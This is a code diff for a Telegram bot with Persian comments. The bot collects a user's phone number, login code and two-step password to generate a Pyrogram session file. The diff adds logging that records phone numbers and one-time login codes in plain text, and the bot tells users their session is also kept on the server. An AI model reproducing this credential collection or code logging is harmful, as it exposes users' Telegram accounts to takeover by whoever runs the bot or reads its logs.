@@ -11,17 +11,19 @@ from pyrogram.errors import (
     FloodWait,
     BadRequest
 )
-from pyrogram.enums import ChatType
 import time
 
 # تنظیمات لاگینگ
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
-# خواندن متغیرهای محیطی - روش صحیح
+# خواندن متغیرهای محیطی
 try:
     API_ID = int(os.environ["API_ID"])
-    logger.info(f"✅ API_ID با موفقیت خوانده شد: {API_ID}")
+    logger.info(f"✅ API_ID با موفقیت خوانده شد")
 except KeyError:
     raise ValueError("❌ API_ID در متغیرهای محیطی تنظیم نشده است!")
 except ValueError:
@@ -29,13 +31,13 @@ except ValueError:
 
 try:
     API_HASH = os.environ["API_HASH"]
-    logger.info(f"✅ API_HASH با موفقیت خوانده شد (طول: {len(API_HASH)})")
+    logger.info(f"✅ API_HASH با موفقیت خوانده شد")
 except KeyError:
     raise ValueError("❌ API_HASH در متغیرهای محیطی تنظیم نشده است!")
 
 try:
     BOT_TOKEN = os.environ["BOT_TOKEN"]
-    logger.info(f"✅ BOT_TOKEN با موفقیت خوانده شد (طول: {len(BOT_TOKEN)})")
+    logger.info(f"✅ BOT_TOKEN با موفقیت خوانده شد")
 except KeyError:
     raise ValueError("❌ BOT_TOKEN در متغیرهای محیطی تنظیم نشده است!")
 
@@ -48,7 +50,7 @@ class UserState:
         self.user_id = user_id
         self.phone = None
         self.phone_code_hash = None
-        self.step = "start"  # start, phone, code, password, done, cancelled
+        self.step = "start"
         self.client = None
         self.session_name = None
         self.is_2fa = False
@@ -68,12 +70,12 @@ class UserState:
         self.is_2fa = False
         self.temp_client = None
 
-# ربات اصلی
+# ربات اصلی - با BOT_TOKEN به عنوان ربات
 app = Client(
     "auth_bot",
     api_id=API_ID,
     api_hash=API_HASH,
-    bot_token=BOT_TOKEN
+    bot_token=BOT_TOKEN  # ✅ این خط برای اجرا به عنوان ربات ضروری است
 )
 
 def get_user_state(user_id):
@@ -86,6 +88,8 @@ def get_user_state(user_id):
 async def start_command(client, message):
     """دستور شروع - مرحله 1"""
     user_id = message.from_user.id
+    logger.info(f"📩 کاربر {user_id} (@{message.from_user.username}) دستور /start را ارسال کرد")
+    
     state = get_user_state(user_id)
     state.reset()
     state.step = "phone"
@@ -96,11 +100,14 @@ async def start_command(client, message):
         "مثال: `+989123456789`\n\n"
         "⚠️ برای لغو فرایند، دستور `/cancel` را ارسال کنید."
     )
+    logger.info(f"✅ پاسخ /start برای کاربر {user_id} ارسال شد")
 
 @app.on_message(filters.command("cancel") & filters.private)
 async def cancel_command(client, message):
     """لغو فرایند - مرحله 7"""
     user_id = message.from_user.id
+    logger.info(f"📩 کاربر {user_id} دستور /cancel را ارسال کرد")
+    
     if user_id in user_sessions:
         state = user_sessions[user_id]
         if state.temp_client:
@@ -116,11 +123,13 @@ async def cancel_command(client, message):
         "برای شروع مجدد، دستور `/start` را ارسال کنید."
     )
 
-@app.on_message(filters.text & filters.private & ~filters.command(["start", "cancel"]))
+@app.on_message(filters.text & filters.private & ~filters.command(["start", "cancel", "help"]))
 async def handle_messages(client, message):
     """مدیریت پیام‌های متنی - مراحل 2 تا 6"""
     user_id = message.from_user.id
     text = message.text.strip()
+    
+    logger.info(f"📩 کاربر {user_id} پیام متنی ارسال کرد: {text[:20]}...")
 
     if user_id not in user_sessions:
         await message.reply_text("لطفاً ابتدا با دستور `/start` شروع کنید.")
@@ -140,7 +149,7 @@ async def handle_messages(client, message):
             state.reset()
 
     except Exception as e:
-        logger.error(f"خطا در پردازش پیام از {user_id}: {e}")
+        logger.error(f"❌ خطا در پردازش پیام از {user_id}: {e}")
         await message.reply_text(
             f"❌ خطایی رخ داد: `{str(e)}`\n\n"
             "لطفاً با `/start` دوباره تلاش کنید."
@@ -149,6 +158,8 @@ async def handle_messages(client, message):
 
 async def handle_phone(client, message, state, phone):
     """مرحله 2: دریافت شماره تلفن"""
+    user_id = message.from_user.id
+    
     # اعتبارسنجی شماره
     if not phone.startswith('+') or not phone[1:].isdigit():
         await message.reply_text(
@@ -159,6 +170,8 @@ async def handle_phone(client, message, state, phone):
         return
 
     try:
+        logger.info(f"📱 کاربر {user_id} شماره {phone} را ارسال کرد")
+        
         # ایجاد کلاینت موقت برای احراز هویت
         session_name = f"session_{state.user_id}_{int(time.time())}"
         state.session_name = session_name
@@ -167,7 +180,7 @@ async def handle_phone(client, message, state, phone):
             session_name,
             api_id=API_ID,
             api_hash=API_HASH,
-            in_memory=True  # استفاده از حافظه برای جلوگیری از ذخیره فایل موقت
+            in_memory=True
         )
         state.temp_client = temp_client
 
@@ -186,6 +199,7 @@ async def handle_phone(client, message, state, phone):
             "`5 5 5 5 5`\n\n"
             "⚠️ کد معتبر تا چند دقیقه است."
         )
+        logger.info(f"✅ کد تأیید برای کاربر {user_id} ارسال شد")
 
     except PhoneNumberInvalid:
         await message.reply_text(
@@ -199,7 +213,7 @@ async def handle_phone(client, message, state, phone):
             f"لطفاً {e.value} ثانیه صبر کنید و دوباره تلاش کنید."
         )
     except Exception as e:
-        logger.error(f"خطا در ارسال کد: {e}")
+        logger.error(f"❌ خطا در ارسال کد برای کاربر {user_id}: {e}")
         await message.reply_text(
             f"❌ **خطا در ارسال کد!**\n\n"
             f"خطا: `{str(e)}`\n"
@@ -209,6 +223,8 @@ async def handle_phone(client, message, state, phone):
 
 async def handle_code(client, message, state, code):
     """مرحله 3 و 4: دریافت و تأیید کد"""
+    user_id = message.from_user.id
+    
     # حذف فاصله‌ها از کد
     code = code.replace(" ", "").strip()
 
@@ -221,6 +237,8 @@ async def handle_code(client, message, state, code):
         return
 
     try:
+        logger.info(f"🔑 کاربر {user_id} کد {code} را ارسال کرد")
+        
         # تأیید کد
         await state.temp_client.sign_in(
             state.phone,
@@ -242,7 +260,7 @@ async def handle_code(client, message, state, code):
         with open(session_file, "w") as f:
             f.write(session_string)
 
-        # ارسال فایل به کاربر - مرحله 10
+        # ارسال فایل به کاربر
         await message.reply_document(
             document=session_file,
             caption=f"✅ **ساخت Session با موفقیت انجام شد!**\n\n"
@@ -252,15 +270,16 @@ async def handle_code(client, message, state, code):
                    f"🔐 این فایل برای اجرای کد اصلی شما ضروری است."
         )
 
-        # مرحله 11: پیام موفقیت
+        # پیام موفقیت
         await message.reply_text(
             "🎉 **فرایند با موفقیت کامل شد!**\n\n"
             "✅ فایل Session ساخته و ارسال شد.\n"
-            "📁 فایل روی سرور نیز ذخیره شده است.\n\n"
-            "💡 برای استفاده از این Session در کد اصلی خود، فایل را در مسیر مناسب قرار دهید."
+            "📁 فایل روی سرور نیز ذخیره شده است."
         )
 
-        # پاک کردن فایل موقت پس از ارسال - مرحله 10
+        logger.info(f"✅ Session برای کاربر {user_id} با موفقیت ساخته و ارسال شد")
+
+        # پاک کردن فایل موقت
         try:
             os.remove(session_file)
         except:
@@ -289,13 +308,14 @@ async def handle_code(client, message, state, code):
             "🔐 **احراز هویت دو مرحله‌ای فعال است!**\n\n"
             "لطفاً رمز عبور دومرحله‌ای خود را وارد کنید."
         )
+        logger.info(f"🔐 کاربر {user_id} به رمز 2FA نیاز دارد")
     except FloodWait as e:
         await message.reply_text(
             f"⏳ **صبر کنید!**\n\n"
             f"لطفاً {e.value} ثانیه صبر کنید و دوباره تلاش کنید."
         )
     except Exception as e:
-        logger.error(f"خطا در تأیید کد: {e}")
+        logger.error(f"❌ خطا در تأیید کد برای کاربر {user_id}: {e}")
         await message.reply_text(
             f"❌ **خطا در تأیید کد!**\n\n"
             f"خطا: `{str(e)}`\n"
@@ -305,7 +325,11 @@ async def handle_code(client, message, state, code):
 
 async def handle_password(client, message, state, password):
     """مرحله 6: دریافت رمز 2FA"""
+    user_id = message.from_user.id
+    
     try:
+        logger.info(f"🔐 کاربر {user_id} رمز 2FA را ارسال کرد")
+        
         # تأیید رمز 2FA
         await state.temp_client.check_password(password)
 
@@ -340,6 +364,8 @@ async def handle_password(client, message, state, password):
             "📁 فایل روی سرور نیز ذخیره شده است."
         )
 
+        logger.info(f"✅ Session برای کاربر {user_id} با موفقیت ساخته و ارسال شد")
+
         # پاک کردن فایل موقت
         try:
             os.remove(session_file)
@@ -361,7 +387,7 @@ async def handle_password(client, message, state, password):
             f"لطفاً {e.value} ثانیه صبر کنید و دوباره تلاش کنید."
         )
     except Exception as e:
-        logger.error(f"خطا در تأیید رمز 2FA: {e}")
+        logger.error(f"❌ خطا در تأیید رمز 2FA برای کاربر {user_id}: {e}")
         await message.reply_text(
             f"❌ **خطا در تأیید رمز!**\n\n"
             f"خطا: `{str(e)}`\n"
@@ -372,6 +398,9 @@ async def handle_password(client, message, state, password):
 @app.on_message(filters.command("help") & filters.private)
 async def help_command(client, message):
     """دستور راهنما"""
+    user_id = message.from_user.id
+    logger.info(f"📩 کاربر {user_id} دستور /help را ارسال کرد")
+    
     await message.reply_text(
         "🤖 **راهنمای ربات ساخت Session**\n\n"
         "🔹 `/start` - شروع فرایند ساخت Session\n"
@@ -391,7 +420,10 @@ async def main():
         logger.info("🤖 ربات در حال اجرا...")
         await app.start()
         logger.info("✅ ربات با موفقیت شروع به کار کرد!")
-        await asyncio.Event().wait()  # منتظر ماندن برای همیشه
+        
+        # اجرای ربات به صورت دائمی
+        await asyncio.Event().wait()
+        
     except KeyboardInterrupt:
         logger.info("⏹️ ربات متوقف شد.")
     except Exception as e:
